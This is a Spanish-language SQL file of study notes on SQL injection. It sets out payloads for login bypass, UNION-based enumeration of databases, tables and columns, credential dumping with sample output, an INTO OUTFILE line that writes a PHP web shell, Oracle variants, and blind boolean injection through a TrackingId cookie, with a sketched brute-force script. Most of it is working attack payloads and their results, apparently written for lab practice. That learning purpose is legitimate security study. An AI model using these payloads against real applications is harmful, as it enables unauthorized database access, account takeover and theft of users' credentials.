-- ! Tener en cuenta para todas las injections que si se realizan a modo de prueba en la consola
-- ! las mismas seran necesarias de realizar con la terminacion (cuando lo amerite) de (;-- -) 
-- ! mientras que en las urls de las paginas webs sera innecesario el ;  

-- mysql -u dobliuw -p_
-- systemctl status mariadb
-- systemctl start mariadb

-- Una injection SQL basica:
SELECT * FROM users WHERE name = '%s' AND status = "ENABLED";
-- Injection:
SELECT * FROM users WHERE name = 'Owen' or 1=1-- -' AND status = "ENABLED";

-- Esto se da en algunas paginas de filtros donde las mismas se realizan por query,
-- se podria ingresar el filtro aplicado, en este caso 'Owen' seguido de una comilla y 
-- un or 1=1-- - para comentar todo lo que venga posteriormente
--! ------------------------------------------------
-- Otra injection SQL si la peticion no esta bien sanitisada podria ser para un bypass:
SELECT * FROM users WHERE username = '%s' AND password = '%s';
-- La sig injection
SELECT * FROM users WHERE username = 'admin'-- -' and password = 'nashe';
-- Ingresando en el form el nombre del administrador seguido de un '-- - 
--! -------------------------------------------------
-- SQL Injection UNION ---> saber cuantas columnas tiene una tabla 

-- Lo primero es averiguar cuantas columas puede tener la tabla, o cuantas se estan seleccionando
SELECT username, password FROM users WHERE x = '%s';

-- Se puede empesar a probar cuantas columnas se esta llamando con la sig injection
SELECT username, password FROM users WHERE x = '%s' order by 4;--';
-- Esto, si se solicitan más columnas de las que se pide ordenar no rompera, pero en cambio, si se
-- pidieran mas columnas de las que pido ordenar no romperia, por lo que podria ir poco a poco acercando
-- el rango hasta dar con la cantidad de columnas llamadas

--* EL error que arrojara sera un internal server error o aveces --> Unknown column '4' in 'order clause'

-- Una vez que se sabe la cantidad de columnas entra en juego la UNION SELECT para convinar datos
-- (Para que sea más representativo el ejemplo y dado que en la consola se puede se podria hacer de la sig manera )

SELECT username, password FROM users WHERE x = '%s' UNION SELECT 1,2;-- -';

-- Esto lo que hace es que los datos representado los estoy convinando con los valores 1 y 2, si se hubieran averiguado que
-- son 10, 11 , 100 columnas, se deberia hacer del 1 al 10, 1 al 11, 1 al 100
--* En la web esto se debera hacer con NULL 

SELECT username, password FROM users WHERE x = '%s' UNION SELECT NULL,NULL;-- -';

-- Una vez sabiendo la cantidad de columnas, y cuales aceptan strings intentando ingresar strings "sjaf"

-- output:

--|     email      |       password        
--|-------------+-----------------------
--| test@gmail.com | learningsqlinjections

-- De esta manera podría empezar a usar esta tecnica para obtener datos de la db, de la version de psql, mysql, oracle, etc
-- Por ejemplo con mysql:

SELECT username, email FROM users WHERE x = '%s' UNION SELECT version(),null;-- -';

-- output:

--|                                                  email                                                   |       password        
--|--------------------------------------------------------------------------------------------------------+-----------------------
--| PostgreSQL 14.4 (Debian 14.4-1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 11.3.0-3) 11.3.0, 64-bit | 
--| test@gmail.com                                                                                           | learningsqlinjections


-- Esto podria servir para injectar codigo sql y depositarlo dentro de un path determinado

select username, password from users where username = "owen" union select "<? php system('whoami'); ?>", "testing" into outfile "/tmp/prueba.txt";-- -';

-- Incluso para listar dbs: 

select password, email from users where username = 'owen' union select null, group_concat(schema_name) from information_schema.schemata;-- -';

-- Agrupar la respuesta podria evitar un error al intentar convinar más de un dato en una respuesta

--! -----------------------------------

-- Injection SQL para averiguar los datos, por ejemplo usuario y contraseña, de otras db

-- Primero donde encontramos la vulnerabilidad, podemos injectar un order by, hasta dar con las columnas, una vez dado con las mismas
-- empezar a hacer un union select intentando listar las base de datos, ingresando el listado de la misma en el campo injectable

select x, y from users where somedb = '%s' union select null, group_concat(schema_name) from information_schema.schemata;-- -';

-- Si bien lo sig no es bueno ya que lista las tablas de todas las base de datos y no de la quisieramos, existe:

select x, y from users where somedb = '%s' union select null, group_concat(table_name) from information_schema.tables;-- -';

-- Se podria listar las tablas de un db en particular:

select x, y from users where somedb = 'Pets' union select null, table_name from information_schema.tables where table_schema='public';-- -';

-- Una vez que tenga la db, las tablas, ahora tocan las columnas:

select x, y from users where somedb = 'Pets' union select null, column_name from information_schema.colums where table_schema='database' and table_name='tablename';-- -';

-- Y ahora, teniendo las columnas, tocan los datos...

select x, y from users where somedb = '%s' union select username, password from ;-- -';



--* Ejemplo completo y real: (db: users, tablas: users, colums: id, username, password, email)

-- 1 (union select)
MariaDB [users]> select email, password from users where username='Owen' union select null, null;-- -' and password='password';
--+-----------------+--------------+
--| email           | password     |
--+-----------------+--------------+
--| nashe@gmail.com | <dsh2^}-$_ñ  |
--| NULL            | NULL         |
--+-----------------+--------------+

-- 2 (listar dbs)
MariaDB [users]> select email, password from users where username='Owen' union select group_concat(schema_name), null from information_schema.schemata;-- -' and password='password'
--+-------------------------------------------------------+--------------+
--| email                                                 | password     |
--+-------------------------------------------------------+--------------+
--| nashe@gmail.com                                       | <dsh2^}-$_ñ  |
--| information_schema,mysql,sys,performance_schema,users | NULL         |
--+-------------------------------------------------------+--------------+

-- 3 (listar tablas de un db de interes)
MariaDB [users]> select email, password from users where username='Owen' union select group_concat(table_name), null from information_schema.tables where table_schema='users';-- -' and password='password';
--+-----------------+--------------+
--| email           | password     |
--+-----------------+--------------+
--| nashe@gmail.com | <dsh2^}-$_ñ  |
--| users           | NULL         |
--+-----------------+--------------+

-- 4 (listar columnas) 
MariaDB [users]> select email, password from users where username='Owen' union select group_concat(column_name), null from information_schema.columns where table_schema='users' and table_name='users';-- -' and password='password';
--+----------------------------+--------------+
--| email                      | password     |
--+----------------------------+--------------+
--| nashe@gmail.com            | <dsh2^}-$_ñ  |
--| id,username,password,email | NULL         |
--+----------------------------+--------------+

-- 5 (listar datos) 
--* En caso de querer extraer los datos de la tabla en uso seria de sig manera, de lo contrario habria que aclarar que db con "from basededatos.tabla" ej "users."
MariaDB [users]> select email, password from users where username='Owen' union select group_concat(email,':',password),null from users;-- -' and password='password';
--+-------------------------------------------------------------------------------------------------------------------------------+--------------+
--| email                                                                                                                         | password     |
--+-------------------------------------------------------------------------------------------------------------------------------+--------------+
--| nashe@gmail.com                                                                                                               | <dsh2^}-$_ñ  |
--| admin123@gmail.com:admin123,nashe@gmail.com:<dsh2^}-$_ñ,fabruko@gmail.com:blowjobinsano123$_,awitaxg@gmail.com:dulcedebatata  | NULL         |
--+-------------------------------------------------------------------------------------------------------------------------------+--------------+

--? Si el group_concat tirase error tmb se podrian concatenar datos de la sig manera --> username||0x3a||password o username||':'||password

--? echo ':'| tr -d '\n'  | xxd -ps
--? echo 'admin'| tr -d '\n'  | xxd -ps
--?  palabra a convertir | quitar salto de linea (0a) | convertir a exadecimal
--* En algunos casos no se permite representar los : con str, por lo que podria ponerse en exadecimal ---> 0x3a y admin ---> 0x61646d696e

--! -------------------------

--todo CON ORACLE 

--todo Con Oracle estas reglas vistas previamente varian y cambian un poco

-- Por ejemplo, para un union select hay que especificar la tabla, se suele usar dual ya que es una tabla default en todas las intacinas oracle

-- Ejemplos:

select * from users where username='%s' union select null, null from dual;-- -'and password='%s';

select * from users where username='%s' union select null, banner from v$version-- - 'and password='%s';

select * from users where username='%s' union select table_name, null from all_tables-- - 'and password='%s';

select * from users where username='%s' union select table_name, null from all_tables-- - 'and password='%s';

select * from users where username='%s' union select owner, null from all_tables-- - 'and password='%s';

select * from users where username='%s' union select table_name, null from all_tables where owner='owner'-- - 'and password='%s';

select * from users where username='%s' union select colum_name, null from all_tab_columns where table_name='table_name'-- -'and password='%s';

select * from users where username='%s' union select username||':'||password, null from table_name-- - 'and password='%s';

--todo En microsoft y mysql ---> version ---> @@version


--! ---------------------------------------------------------------------

--!BLIND INJECTIONS 

--* Conditionals errors

-- Los errores causados por sql no se ven, por lo que hay que obtenerlos

-- En este caso estamos trabajando con vulnerabilidades en la TrackingId que es una query

-- por detras la query debe ser similar a algo asi:
select * from products where TrackingId='KSHK23N,N' 

-- al agregarle una comilla la misma rompe, logicamente ya que convertimos la query con un ' de más

-- El error no es visible en la web porque es a ciegas, pero se genera el error y desaparece el apartado o msj "welcomeback", 
-- esto justamente le da el nombre a estas vulnerabilidades que son "conditional error" depende si hay un error se muestra o 
-- deja de mostrar algo

-- De esta manera, ya que estamos trabajando con Burp Suite si pusieramos la cookie --> 
Cookie: TrackingId=R6IxX1tiUucyn6LL' and (select 'a' from users where username='administrator')='a;
 session=HsruyDEGYrpy37NAwSP4PBKssbTEh6LP

-- injectando una nueva query en donde seleccionamos la letra a de la tabla users del usuario administrador, podemos ver que 
-- previamente entendimos que aquellos valores  falsos hacian desaparecer la palabra wellcomeback mientras que los true la 
-- mantenian en pantalla

-- de esta manera podemos entender que caracter a caracter podemos ir verificando si el username es correcto y existe, como tmb 
-- podriamos ir descubriendo la password

--* Esta injeccion puede ser resuelta con un scrip, en este caso, esta vulnerabilidad representa en pantalla un Welcome Back! 
--* cuando el servidor no devuelve un error o devuelve datos, luego de indagar para darnos cuenta de esto, empezamos a probar
--* cosas como intentar ver si la primera letra del username Administrator de la tabla users es a, lo q nos devuelve true y vemos
--* por consecuencia el Welcome back, de esta manera, podemos llevar al escenario en donde probamos lo mismo para la password

--?  ' and (select substring(username,1,1) from users where username='Administrator')=a'

--?  ' and (select substring(password,1,1) from users where username='Administrator')=a

--* De esta manera tenemos una via potencial para intentar listar la contraseña con fuerza bruta, logicamente el problema es
--* que es a ciegas, pero encontramos una manera de poder saber esto, por lo tanto, creamos un script en python instalando
--* la libreria pwntools

--?  pip3 install pwntools 

--* nos importamos todo de la misma asi como los modulos requests para poder hacer peticiones http, signal para poder capturar el
--* ctrl + c (signal.signal(signal.SIGINT, functionaejecutar)), el modulo time para poder gacer sleeps, el sys para poder ejecutar
--* comandos como sys.exit(1), y string para poder tener caracteres que quiera a-z (string.ascii_lowercase), 0-9 (string.digits)
--* Y de esta manera estariamos listos para poder recorrer la length máxima de la contraseña previamente conseguida:

--?  Cookie: TrackingId=q3XzfKFtNBf4dtNv' and (select 'a' from users where username='administrator' and length(password)>=20)='a;

--* Y solo habria que recorrer esta length recorriendo a su vez por cada posición cada una de las posibilidades de caracteres
--* que podrían ser y simplemente leer la respuesta para ver si existe el string "Welcome back!" en la misma en el text.

